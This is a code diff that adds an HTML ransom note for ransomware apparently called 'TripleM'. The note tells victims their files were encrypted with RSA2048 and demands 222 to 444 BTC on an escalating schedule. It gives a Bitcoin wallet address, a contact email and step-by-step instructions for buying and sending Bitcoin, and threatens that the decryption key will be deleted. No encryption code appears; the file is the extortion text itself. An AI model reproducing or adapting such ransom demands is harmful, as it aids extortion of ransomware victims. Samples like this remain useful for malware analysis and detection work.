@@ -1,0 +1,109 @@
+<html>
+ <head>,
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <title>TripleM Ransomware</title>
+  <style>
+ 
+  @import url('https://fonts.googleapis.com/css?family=Montserrat');
+  body {
+    background-color: #F5F5F5;
+}
+  .title {
+    font-family: "Montserrat";
+    text-align: center;
+    color: #FFF;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    letter-spacing: 1px;
+}
+ 
+h1 {
+    background-image: url(https://media.giphy.com/media/26BROrSHlmyzzHf3i/giphy.gif);
+    background-size: cover;
+    color: transparent;
+    -moz-background-clip: text;
+    -webkit-background-clip: text;
+    text-transform: uppercase;
+    font-size: 120px;
+    line-height: .75;
+    margin: 10px 0;
+}
+/* styling my button */
+ 
+.white-mode {
+    text-decoration: none;
+    padding: 7px 10px;
+    background-color: #122;
+    border-radius: 3px;
+    color: #FFF;
+    transition: .35s ease-in-out;
+    position: absolute;
+    left: 15px;
+    bottom: 15px;
+    font-family: "Montserrat";
+}
+ 
+.white-mode:hover {
+    background-color: #FFF;
+    color: #122;
+}
+</style>
+ </head>
+ <body bgcolor="#F5F5F5">
+ 
+    <pre>
+   
+ ███▄ ▄███▓ ███▄ ▄███▓ ███▄ ▄███▓    ██▀███  ▓█████  ▄▄▄▄    ▒█████   ██▀███   ███▄    █     ██▀███   ▄▄▄       ███▄    █   ██████  ▒█████   ███▄ ▄███▓ █     █░ ▄▄▄       ██▀███  ▓█████
+▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒   ▓██ ▒ ██▒▓█   ▀ ▓█████▄ ▒██▒  ██▒▓██ ▒ ██▒ ██ ▀█   █    ▓██ ▒ ██▒▒████▄     ██ ▀█   █ ▒██    ▒ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀
+▓██    ▓██░▓██    ▓██░▓██    ▓██░   ▓██ ░▄█ ▒▒███   ▒██▒ ▄██▒██░  ██▒▓██ ░▄█ ▒▓██  ▀█ ██▒   ▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   ▒██░  ██▒▓██    ▓██░▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███  
+▒██    ▒██ ▒██    ▒██ ▒██    ▒██    ▒██▀▀█▄  ▒▓█  ▄ ▒██░█▀  ▒██   ██░▒██▀▀█▄  ▓██▒  ▐▌██▒   ▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒▒██   ██░▒██    ▒██ ░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄
+▒██▒   ░██▒▒██▒   ░██▒▒██▒   ░██▒   ░██▓ ▒██▒░▒████▒░▓█  ▀█▓░ ████▓▒░░██▓ ▒██▒▒██░   ▓██░   ░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░▒██████▒▒░ ████▓▒░▒██▒   ░██▒░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒
+░ ▒░   ░  ░░ ▒░   ░  ░░ ▒░   ░  ░   ░ ▒▓ ░▒▓░░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░   ▒ ▒    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ░  ░░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░
+░  ░      ░░  ░      ░░  ░      ░     ░▒ ░ ▒░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░   ░▒ ░ ▒░░ ░░   ░ ▒░     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░  ░ ▒ ▒░ ░  ░      ░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░
+░      ░   ░      ░   ░      ░        ░░   ░    ░    ░    ░ ░ ░ ░ ▒    ░░   ░    ░   ░ ░      ░░   ░   ░   ▒      ░   ░ ░ ░  ░  ░  ░ ░ ░ ▒  ░      ░     ░   ░    ░   ▒     ░░   ░    ░  
+       ░          ░          ░         ░        ░  ░ ░          ░ ░     ░              ░       ░           ░  ░         ░       ░      ░ ░         ░       ░          ░  ░   ░        ░  ░
+                                                          ░                                                                                                                              
+ 
+ 
+    </pre>
+   
+ 
+   
+   <p><center><b><font size="5"  face="Arial">NOT YOUR LANGUAGE? Use Google Translate</br>
+   </br><font size="5" color="lime" face="Arial">What happened to your files?</font></br>
+   All of your files were encrypted by a strong encryption with RSA2048</br>
+   
+   
+   </br><font size="5" color="lime" face="Arial">How did this happen?</font>
+   <ul>
+   <li>Specially for your PC was generated personal RSA2048 Key, both public and private.</li>
+   <li>ALL YOUR FILES were encrypted with the public key, which has been transferred to your PC via the Internet.</li>
+   <li>Decrypting of your files is only possible with the help of the private key and decrypt program, which is on our Server</li>
+   </ul>
+   </br></br>
+   <font size="5" color="lime" face="Arial">What do I do?</font>
+   </br>So,there are two ways you can choose: wait for a miracle and get your price doubled, or start obtaining BITCOIN NOW and restore your data easy way.
+   </br>If you have really valuable data, your better not waste your time, because there is no other way to get your files, except payment.
+   
+   </br></br>Your personal ID: <font size="5" color="orange" face="Arial">[redacted 8 lowercase alphanum].[redacted 3 lowercase alphanum]</font>
+   </br>Your personal wallet adress: <font size="5" color="orange" face="Arial"> 18NYQLduStwnBS9XiLr8MuHvsmUx6RRQhK</font>
+   </br></br>
+   
+   </br> Your price start from 222 BTC , after week he is 333 BTC , after 3 week he is 444 BTC. 10 January your secret key has been deleted.
+   </br></br>
+   
+   <font size="5" color="lime" face="Arial">Instruction:</font>
+   </br>---- Buy Bitcoin on btc exchange sites (Coinbase,Localbitcoins, Coinmama and another).For buy Bitcoin you need confirm your Identify.
+   </br>---- Buy Bitcoin offline in ATM or from seller (watch https://coinatmradar.com/blog/how-to-buy-bitcoins-with-bitcoin-atm/ )
+   </br>2)send Bitcoins to  <font size="5" color="orange" face="Arial"> 18NYQLduStwnBS9XiLr8MuHvsmUx6RRQhK</font>
+ 
+   </br>3)Write us to email <font size="5" color="orange" face="Arial">mmm_reborn@tutamail.com</font>
+   </br>4)After we confirm payment - we send you decryption software and Private Key for decrypt your files.
+   
+   
+   </b></font></center></p>
+ </body>
+</html>
